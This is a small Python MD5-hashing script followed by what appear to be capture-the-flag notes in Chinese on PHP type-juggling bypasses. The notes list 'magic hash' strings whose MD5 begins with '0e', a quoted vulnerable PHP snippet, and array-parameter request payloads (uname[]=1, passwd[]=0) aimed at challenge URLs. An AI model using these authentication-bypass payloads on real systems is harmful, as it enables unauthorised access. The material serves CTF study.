import hashlib

m=hashlib.md5()
password=""
password=input(password)
password=password.encode('ascii')
m.update(password)
print(m.hexdigest())
'''
介绍一批md5开头是0e的字符串 上文提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0
QNKCDZO
0e830400451993494058024219903391
 
s878926199a
0e545993274517709034328855841020
  
s155964671a
0e342768416822451524974117254469
  
s214587387a
0e848240448830537924465865611904
  
s214587387a
0e848240448830537924465865611904
  
s878926199a
0e545993274517709034328855841020
  
s1091221200a
0e940624217856561557816327384675
解决方法2
http://chinalover.sinaapp.com/web17/index.php?a[]=0&b[]=1
'''

'''
<?php highlight_file('flag.php'); 
$_GET['id'] = urldecode($_GET['id']);
 $flag = 'flag{xxxxxxxxxxxxxxxxxx}';
 if (isset($_GET['uname']) and isset($_POST['passwd']))
  { 
  if ($_GET['uname'] == $_POST['passwd']) 
  print 'passwd can not be uname.'; 
  else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&($_GET['id']=='margin'))
   die('Flag: '.$flag); 
   else print 'sorry!'; 
   }
'''
#shal漏洞
# http://120.24.86.145:8002/web7/?id=margin&uname[]=1
# post   passwd[]=0